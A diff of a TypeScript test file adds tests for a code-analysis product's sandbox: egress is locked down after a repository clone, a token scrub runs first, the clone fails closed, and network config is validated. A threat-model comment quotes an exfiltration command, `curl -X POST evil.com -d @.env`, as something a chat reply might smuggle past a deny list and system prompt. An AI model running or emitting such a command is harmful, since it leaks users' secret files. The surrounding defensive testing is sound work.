@@ -40,7 +40,12 @@ vi.mock("@daytona/sdk", () => ({
   DaytonaNotFoundError: MockDaytonaNotFoundError,
 }));
 
-import { cloneRepositoryInSandbox, getSandboxState, getRemoteSandboxDetails } from "./daytona";
+import {
+  assertSandboxProvisioningConfigured,
+  cloneRepositoryInSandbox,
+  getRemoteSandboxDetails,
+  getSandboxState,
+} from "./daytona";
 
 describe("daytona state normalization", () => {
   beforeEach(() => {
@@ -109,42 +114,57 @@ describe("daytona state normalization", () => {
  *   3. The substituted URL is POSIX-single-quoted so a malicious or
  *      malformed `args.url` cannot break out of the shell command.
  */
+/**
+ * Build a Daytona sandbox mock that:
+ *   - records every `git.clone(...)` and `process.executeCommand(...)`
+ *     in the order they are invoked (so tests can assert ordering);
+ *   - returns plausible `result` strings from branch / SHA commands
+ *     so the function's return value remains assertable;
+ *   - records every `updateNetworkSettings(...)` call and optionally
+ *     delegates to a caller-supplied implementation (e.g., to throw a
+ *     simulated Tier 1/2 rejection).
+ *
+ * Lifted to module scope so multiple describe blocks (token scrub,
+ * post-clone network lockdown) share one helper rather than diverging.
+ */
+function makeSandboxMock(
+  options: { updateNetworkSettings?: (settings: { networkBlockAll?: boolean }) => Promise<void> } = {},
+) {
+  const cloneCalls: unknown[][] = [];
+  const executeCalls: { command: string; cwd?: string }[] = [];
+  const networkSettingsCalls: { networkBlockAll?: boolean }[] = [];
+  const sandbox = {
+    git: {
+      clone: vi.fn(async (...args: unknown[]) => {
+        cloneCalls.push(args);
+      }),
+    },
+    process: {
+      executeCommand: vi.fn(async (command: string, cwd?: string) => {
+        executeCalls.push({ command, cwd });
+        if (command === "git branch --show-current") {
+          return { exitCode: 0, result: "main\n" };
+        }
+        if (command === "git rev-parse HEAD") {
+          return { exitCode: 0, result: "deadbeefcafef00d\n" };
+        }
+        // The token-scrub command (`git remote set-url origin ...`)
+        // is fire-and-forget; an empty result is fine.
+        return { exitCode: 0, result: "" };
+      }),
+    },
+    updateNetworkSettings: vi.fn(async (settings: { networkBlockAll?: boolean }) => {
+      networkSettingsCalls.push(settings);
+      if (options.updateNetworkSettings) {
+        await options.updateNetworkSettings(settings);
+      }
+    }),
+  };
+  return { sandbox, cloneCalls, executeCalls, networkSettingsCalls };
+}
+
 describe("cloneRepositoryInSandbox — Plan 05 token scrub", () => {
   const SANDBOX_REMOTE_ID = "sandbox-clone-1";
-
-  /**
-   * Build a Daytona sandbox mock that:
-   *   - records every `git.clone(...)` and `process.executeCommand(...)`
-   *     in the order they are invoked (so tests can assert ordering);
-   *   - returns plausible `result` strings from branch / SHA commands
-   *     so the function's return value remains assertable.
-   */
-  function makeSandboxMock() {
-    const cloneCalls: unknown[][] = [];
-    const executeCalls: { command: string; cwd?: string }[] = [];
-    const sandbox = {
-      git: {
-        clone: vi.fn(async (...args: unknown[]) => {
-          cloneCalls.push(args);
-        }),
-      },
-      process: {
-        executeCommand: vi.fn(async (command: string, cwd?: string) => {
-          executeCalls.push({ command, cwd });
-          if (command === "git branch --show-current") {
-            return { exitCode: 0, result: "main\n" };
-          }
-          if (command === "git rev-parse HEAD") {
-            return { exitCode: 0, result: "deadbeefcafef00d\n" };
-          }
-          // The token-scrub command (`git remote set-url origin ...`)
-          // is fire-and-forget; an empty result is fine.
-          return { exitCode: 0, result: "" };
-        }),
-      },
-    };
-    return { sandbox, cloneCalls, executeCalls };
-  }
 
   beforeEach(() => {
     process.env.DAYTONA_API_KEY = "test-api-key";
@@ -254,5 +274,331 @@ describe("cloneRepositoryInSandbox — Plan 05 token scrub", () => {
     const scrubCall = executeCalls.find((call) => call.command.startsWith("git remote set-url origin"));
     // The raw `'` is replaced by `'\''`; the surrounding wrap is `'…'`.
     expect(scrubCall?.command).toBe(`git remote set-url origin 'https://github.com/acme/oops'\\''.git'`);
+  });
+});
+
+/**
+ * Post-clone network lockdown.
+ *
+ * The threat: even with the deny list and the read-only system prompt, the
+ * sandbox container has unrestricted egress until Systify explicitly blocks
+ * it. A chat reply that smuggles `curl -X POST evil.com -d @.env` (or any
+ * deny-list bypass) past Layer 3 would otherwise complete the leak. Once the
+ * source is on disk, Systify never needs sandbox-side network — every legit
+ * tool (`read_file`, `list_dir`, `executeCommand`) rides Daytona's control
+ * plane, which is independent of the sandbox container's outbound traffic.
+ *
+ * These tests pin the resolved contract:
+ *   1. `updateNetworkSettings({ networkBlockAll: true })` is called on every
+ *      clone (auth or no auth — hardening, not feature-gated).
+ *   2. The block runs AFTER the token scrub. Reversing the order would leave
+ *      the `.git/config` token reachable during the brief window before the
+ *      iptables rule applies; the SDK call is also higher-latency than the
+ *      one-shot scrub, so anything that could race against it benefits from
+ *      the scrub-first ordering.
+ *   3. If `updateNetworkSettings` throws (typically Daytona Tier 1/2), the
+ *      whole clone fails-closed: a sandbox with private content on disk and
+ *      open egress is the worst-of-both-worlds posture, so we propagate the
+ *      error to the import pipeline rather than silently degrading.
+ */
+describe("cloneRepositoryInSandbox — post-clone network lockdown", () => {
+  const SANDBOX_REMOTE_ID = "sandbox-network-1";
+
+  beforeEach(() => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    // Force the secure-default branch for the original ordering / fail-closed
+    // tests; the env-var-gating describe below flips this explicitly.
+    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "true";
+    getMock.mockReset();
+  });
+
+  afterEach(() => {
+    delete process.env.DAYTONA_API_KEY;
+    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
+  });
+
+  test("blocks all egress after a tokened clone", async () => {
+    const { sandbox, networkSettingsCalls } = makeSandboxMock();
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/widget.git",
+      branch: "main",
+      token: `ghs_${"x".repeat(40)}`,
+    });
+
+    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
+    expect(sandbox.updateNetworkSettings).toHaveBeenCalledTimes(1);
+  });
+
+  test("blocks egress for unauthenticated public-repo clones too (hardening, not feature-gated)", async () => {
+    const { sandbox, networkSettingsCalls } = makeSandboxMock();
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/public-widget.git",
+      branch: "main",
+    });
+
+    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
+  });
+
+  test("network block runs AFTER the token scrub so the scrub is never skipped on a block failure", async () => {
+    // We want the scrub to land first because (a) it is the security
+    // invariant `daytona.test.ts` already pins, and (b) if the network
+    // block call throws (Tier 1/2 limitation), we still want the on-disk
+    // token leak removed before the import is failed and the sandbox is
+    // cleaned up by the import pipeline.
+    const callOrder: string[] = [];
+    const { sandbox } = makeSandboxMock();
+    sandbox.process.executeCommand = vi.fn(async (command: string) => {
+      callOrder.push(`exec:${command}`);
+      if (command === "git branch --show-current") {
+        return { exitCode: 0, result: "main\n" };
+      }
+      if (command === "git rev-parse HEAD") {
+        return { exitCode: 0, result: "deadbeefcafef00d\n" };
+      }
+      return { exitCode: 0, result: "" };
+    });
+    sandbox.updateNetworkSettings = vi.fn(async (settings: { networkBlockAll?: boolean }) => {
+      callOrder.push(`network:blockAll=${settings.networkBlockAll}`);
+    });
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/widget.git",
+      branch: "main",
+      token: `ghs_${"x".repeat(40)}`,
+    });
+
+    const scrubIndex = callOrder.findIndex((entry) => entry.startsWith("exec:git remote set-url origin"));
+    const blockIndex = callOrder.findIndex((entry) => entry.startsWith("network:blockAll=true"));
+    const branchIndex = callOrder.findIndex((entry) => entry === "exec:git branch --show-current");
+
+    expect(scrubIndex).toBeGreaterThanOrEqual(0);
+    expect(blockIndex).toBeGreaterThan(scrubIndex);
+    expect(branchIndex).toBeGreaterThan(blockIndex);
+  });
+
+  test("propagates the error and fails-closed when the SDK rejects updateNetworkSettings (Tier 1/2 case)", async () => {
+    const tierLimitationError = new Error(
+      "Sandbox-level network policy override is only available for Tier 3+ organizations.",
+    );
+    const { sandbox } = makeSandboxMock({
+      updateNetworkSettings: async () => {
+        throw tierLimitationError;
+      },
+    });
+    getMock.mockResolvedValue(sandbox);
+
+    await expect(
+      cloneRepositoryInSandbox({
+        remoteId: SANDBOX_REMOTE_ID,
+        url: "https://github.com/acme/widget.git",
+        branch: "main",
+        token: `ghs_${"x".repeat(40)}`,
+      }),
+    ).rejects.toThrow(tierLimitationError);
+  });
+});
+
+/**
+ * Tier-aware env-var gating for the post-clone block.
+ *
+ * Daytona's `updateNetworkSettings` is rejected at the API layer for
+ * organizations on Tier 1 / Tier 2 — those operators cannot rely on the
+ * iptables-layer egress block at all. `DAYTONA_POST_CLONE_BLOCK_NETWORK`
+ * lets a deployment opt out of the SDK call so import does not fail-closed
+ * on a tier limitation it cannot fix without a billing change.
+ *
+ * The contract these tests pin:
+ *   1. Unset (default) → call happens (secure-by-default; matches the
+ *      ordering / fail-closed describe above).
+ *   2. Truthy values (`true` / `1` / `yes` / `on`, case-insensitive) →
+ *      call happens.
+ *   3. Falsy values (`false` / `0` / `no` / `off`, case-insensitive) →
+ *      call is skipped AND a `post_clone_network_block_skipped` warn is
+ *      emitted, so operators have a structured signal that the network
+ *      layer is no longer enforcing egress.
+ *   4. Garbage / typo values → fall back to `true`. A typo in env config
+ *      must not silently disable a security control. Mirrors the
+ *      `parseRolloutPercent` "invalid → fail-closed to 0" pattern in
+ *      `lib/sandboxRollout.ts`.
+ *   5. Skipping the block does NOT skip the token scrub. Layer 1 (token
+ *      scrub) and Layer 4 (network block) are independent invariants;
+ *      the gate only controls Layer 4.
+ */
+describe("cloneRepositoryInSandbox — DAYTONA_POST_CLONE_BLOCK_NETWORK gating", () => {
+  const SANDBOX_REMOTE_ID = "sandbox-tier-gate-1";
+
+  beforeEach(() => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
+    getMock.mockReset();
+  });
+
+  afterEach(() => {
+    delete process.env.DAYTONA_API_KEY;
+    delete process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK;
+  });
+
+  test("unset env defaults to secure (calls updateNetworkSettings)", async () => {
+    const { sandbox, networkSettingsCalls } = makeSandboxMock();
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/widget.git",
+      branch: "main",
+    });
+
+    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
+  });
+
+  test.each(["true", "1", "yes", "on", "TRUE", "On"])("truthy value %s calls updateNetworkSettings", async (value) => {
+    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = value;
+    const { sandbox, networkSettingsCalls } = makeSandboxMock();
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/widget.git",
+      branch: "main",
+    });
+
+    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
+  });
+
+  test.each(["false", "0", "no", "off", "FALSE", "Off"])(
+    "falsy value %s skips updateNetworkSettings and warns",
+    async (value) => {
+      process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = value;
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+      const { sandbox, networkSettingsCalls } = makeSandboxMock();
+      getMock.mockResolvedValue(sandbox);
+
+      await cloneRepositoryInSandbox({
+        remoteId: SANDBOX_REMOTE_ID,
+        url: "https://github.com/acme/widget.git",
+        branch: "main",
+      });
+
+      expect(networkSettingsCalls).toEqual([]);
+      expect(sandbox.updateNetworkSettings).not.toHaveBeenCalled();
+      const warnCall = warnSpy.mock.calls.find(([message]) =>
+        typeof message === "string" ? message.includes("post_clone_network_block_skipped") : false,
+      );
+      expect(warnCall).toBeDefined();
+      warnSpy.mockRestore();
+    },
+  );
+
+  test("garbage / typo values fall back to the secure default", async () => {
+    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "perhaps";
+    const { sandbox, networkSettingsCalls } = makeSandboxMock();
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/widget.git",
+      branch: "main",
+    });
+
+    expect(networkSettingsCalls).toEqual([{ networkBlockAll: true }]);
+  });
+
+  test("skipping the block does NOT skip the token scrub", async () => {
+    process.env.DAYTONA_POST_CLONE_BLOCK_NETWORK = "false";
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+    const { sandbox, executeCalls } = makeSandboxMock();
+    getMock.mockResolvedValue(sandbox);
+
+    await cloneRepositoryInSandbox({
+      remoteId: SANDBOX_REMOTE_ID,
+      url: "https://github.com/acme/widget.git",
+      branch: "main",
+      token: `ghs_${"x".repeat(40)}`,
+    });
+
+    const scrubCall = executeCalls.find((call) => call.command.startsWith("git remote set-url origin"));
+    expect(scrubCall).toBeDefined();
+    expect(scrubCall?.command).toBe(`git remote set-url origin 'https://github.com/acme/widget.git'`);
+    warnSpy.mockRestore();
+  });
+});
+
+/**
+ * `assertSandboxProvisioningConfigured` is the fail-fast gate that the import
+ * pipeline calls before any side effects. The previous "throw inside
+ * provisionSandbox" check fired late (after the GitHub access probe and
+ * sandbox row reservation) and conflated two operator intents: "I never
+ * configured this var" (unsafe to ship) and "I want Daytona's default
+ * policy" (the documented dev posture).
+ *
+ * These tests pin the resolved contract:
+ *   1. Missing `DAYTONA_API_KEY` throws — never reached the network check.
+ *   2. Missing `DAYTONA_NETWORK_ALLOW_LIST` throws — even with a valid key.
+ *   3. Empty string allow list passes — that is the explicit "use default
+ *      policy" signal, distinguished from "unset".
+ *   4. Non-empty allow list passes (the production posture).
+ */
+describe("assertSandboxProvisioningConfigured", () => {
+  beforeEach(() => {
+    delete process.env.DAYTONA_API_KEY;
+    delete process.env.DAYTONA_NETWORK_ALLOW_LIST;
+  });
+
+  afterEach(() => {
+    delete process.env.DAYTONA_API_KEY;
+    delete process.env.DAYTONA_NETWORK_ALLOW_LIST;
+  });
+
+  test("throws when DAYTONA_API_KEY is missing", () => {
+    process.env.DAYTONA_NETWORK_ALLOW_LIST = "";
+    expect(() => assertSandboxProvisioningConfigured()).toThrow(/DAYTONA_API_KEY/);
+  });
+
+  test("throws when DAYTONA_NETWORK_ALLOW_LIST is unset (operator never made a choice)", () => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    expect(() => assertSandboxProvisioningConfigured()).toThrow(/DAYTONA_NETWORK_ALLOW_LIST/);
+  });
+
+  test("passes when allow list is explicitly empty (Daytona default policy opt-in)", () => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    process.env.DAYTONA_NETWORK_ALLOW_LIST = "";
+    expect(() => assertSandboxProvisioningConfigured()).not.toThrow();
+  });
+
+  test("passes when allow list is whitespace-only (treated as explicit empty)", () => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    process.env.DAYTONA_NETWORK_ALLOW_LIST = "   ";
+    expect(() => assertSandboxProvisioningConfigured()).not.toThrow();
+  });
+
+  test("passes when allow list is a non-empty production CIDR value", () => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    process.env.DAYTONA_NETWORK_ALLOW_LIST = "140.82.112.0/20";
+    expect(() => assertSandboxProvisioningConfigured()).not.toThrow();
+  });
+
+  test("passes when allow list is a comma-separated list of IPv4 CIDR ranges", () => {
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    process.env.DAYTONA_NETWORK_ALLOW_LIST = "140.82.112.0/20, 192.30.252.0/22";
+    expect(() => assertSandboxProvisioningConfigured()).not.toThrow();
+  });
+
+  test("throws with the offending tokens when allow list contains a non-CIDR entry", () => {
+    // Daytona's `networkAllowList` field is parsed as a comma-separated CIDR
+    // list — `github.com:443` and other domain:port values are silently
+    // rejected at sandbox creation. Validating up front turns a runtime
+    // failure (deep in `daytona.create`) into an actionable error at the
+    // import pipeline's entry point.
+    process.env.DAYTONA_API_KEY = "test-api-key";
+    process.env.DAYTONA_NETWORK_ALLOW_LIST = "140.82.112.0/20, github.com:443";
+    expect(() => assertSandboxProvisioningConfigured()).toThrow(/github\.com:443/);
   });
 });
